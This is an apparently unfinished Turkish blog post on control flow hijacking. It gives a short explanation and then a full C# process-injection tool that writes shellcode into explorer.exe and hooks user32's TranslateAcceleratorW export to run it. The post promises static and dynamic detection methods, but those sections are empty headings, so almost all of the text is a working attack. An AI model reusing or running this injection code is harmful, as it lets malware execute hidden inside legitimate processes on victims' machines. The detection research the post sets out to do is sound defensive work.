---
layout: post
title: "Control Flow Hijacking Analysis and Detection"
categories: blue
---

Selam bugün staj kabulüm için araştırdığım ve kendisi için tespit mekanizmaları geliştirmeye çalışacağım control flow hijacking konusunu irdeleyeceğiz.

## İÇERİKLER
1. [Nedir bu Control Flow Hijacking, diğerlerinden farkı ne ?](#nedir-bu-control-flow-hijacking-diğerlerinden-farkı-ne-)
2. [Basit Bir Saldırı Örneği](#basit-bir-saldırı-örneğ)
3. [Basit Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları](#basit-saldırı-örneğine-karşı-statik-ve-dinamik-tespit-mekanizmaları)
4. [Karmaşık Bir Saldırı Örneği](#karmaşık-bir-saldırı-örneği)
5. [Karmaşık Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları](#basit-saldırı-örneğine-karşı-statik-ve-dinamik-tespit-mekanizmaları)
6. [Kapanış](#kapanış)


## Nedir bu Control Flow Hijacking, diğerlerinden farkı ne ?

Türkçe "kontrol akışını ele geçirme" şeklinde çevirebiliriz. Anlaşıldığı üzere çook geniş bir saldırı spektrumundan bahsediyoruz bu saldırı türünün içine pwn tarafında bufferoverflow ile stack teki ret adresini ele geçirme yahut heapoverflow ile fonksiyon pointer larının üzerine shellcode adresimizi yazmak girebilir. Malware tarafında ise dümdüz hedef process in thread lerinden birini durdurup kendi ayarladığımız context i yükleyip shellcode umuzu çalıştırmak gibi fikirler bu saldırı vektörü altında toplanabilir. Kısaca programın olağan akışını durdurmak, zehirlemek yada değiştirmek gibi her türlü faaliyeti Control Flow Hijacking altında değerlendirebiliriz.

## Basit Bir Saldırı Örneği
```c
public static void Main(string[] args) {
    string processname = args.Length == 0 ? "explorer" : args[0];
    var showHelp = false;
    string shellcodeStr = null;
    string dll = "user32.dll";
    string export = args.Length == 0 ? "TranslateAcceleratorW" : args[1];
    int[] pids;
    int[] pids_s = getProcIds(processname);
    for(int i = 0; i < pids_s.Length; i++) {
        
    }

    pids = getProcIds(processname);
    Console.WriteLine($"[=] Find {pids.Length} pid with process name: {processname}.exe");
    for (int i = 0; i < pids.Length; i++) {
        Console.WriteLine($"[=] Hijecting pid: {pids[i]}");

        var hModule = GetModuleHandle(dll);

        if (hModule == IntPtr.Zero)
            hModule = LoadLibrary(dll);

        if (hModule == IntPtr.Zero) {
            Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
            return;
        }

        var exportAddress = GetProcAddress(hModule, export);
        if (exportAddress == IntPtr.Zero) {
            Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
            return;
        }

        Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");

        var status = OpenProcess(pids[i], out var hProcess);
        if (status != 0 || hProcess == IntPtr.Zero) {
            Console.WriteLine($"[!] Failed to open PID {pids[i]}: {status}.");
            return;
        }

        Console.WriteLine($"[=] Opened process with id {pids[i]}");

        var shellcode = LoadShellcode(shellcodeStr);

        var loaderAddress = FindMemoryHole(
            hProcess,
            (ulong)exportAddress,
            ShellcodeLoader.Length + shellcode.Length);

        if (loaderAddress == 0) {
            Console.WriteLine("[!] Failed to find a memory hole with 2G of export address, bailing");
            return;
        }

        Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pids[i]}");

        var originalBytes = Marshal.ReadInt64(exportAddress);
        GenerateHook(originalBytes);

        ProtectVirtualMemory(
            hProcess,
            exportAddress,
            8,
            MemoryProtection.ExecuteReadWrite,
            out var oldProtect);

        var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
        var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };

        using var ms = new MemoryStream(callOpCode);
        using var br = new BinaryWriter(ms);
        br.Seek(1, SeekOrigin.Begin);
        br.Write(relativeLoaderAddress);

        status = WriteVirtualMemory(
            hProcess,
            exportAddress,
            callOpCode,
            out var bytesWritten);

        if (status != NTSTATUS.Success || (int)bytesWritten != callOpCode.Length) {
            Console.WriteLine($"[!] Failed to write callOpCode: {status}");
            return;
        }

        var payload = ShellcodeLoader.Concat(shellcode).ToArray();
        //WriteProcessMemory(hProcess, (IntPtr)loaderAddress, payload, payload.Length, out _);

        status = ProtectVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            (uint)payload.Length,
            MemoryProtection.ReadWrite,
            out oldProtect);

        if (status != NTSTATUS.Success) {
            Console.WriteLine($"[!] Failed to unprotect 0x{loaderAddress:x}");
            return;
        }

        status = WriteVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            payload,
            out bytesWritten);

        if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length) {
            Console.WriteLine($"[!] Failed to write payload: {status}");
            return;
        }

        status = ProtectVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            (uint)payload.Length,
            oldProtect,
            out _);

        if (status != NTSTATUS.Success) {
            Console.WriteLine($"[!] Failed to protect 0x{loaderAddress:x}");
            return;
        }

        var timer = new Stopwatch();
        timer.Start();
        var executed = false;

        Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");

        while (timer.Elapsed.TotalSeconds < 60) {
            var bytesToRead = 8;
            var buf = Marshal.AllocHGlobal(bytesToRead);

            ReadVirtualMemory(
                hProcess,
                exportAddress,
                buf,
                (uint)bytesToRead,
                out var bytesRead);

            var temp = new byte[bytesRead];
            Marshal.Copy(buf, temp, 0, bytesToRead);
            var currentBytes = BitConverter.ToInt64(temp, 0);

            if (originalBytes == currentBytes) {
                executed = true;
                break;
            }

            Thread.Sleep(1000);
        }

        timer.Stop();

        if (executed) {
            ProtectVirtualMemory(
                hProcess,
                exportAddress,
                8,
                oldProtect,
                out _);

            FreeVirtualMemory(
                hProcess,
                (IntPtr)loaderAddress);

            Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");
        }
        else {
            Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up");
        }

        CloseHandle(hProcess);
        Console.WriteLine();
        Console.WriteLine();
    }
}
```
## Basit Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları

## Karmaşık Bir Saldırı Örneği

## Karmaşık Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları

## Kapanış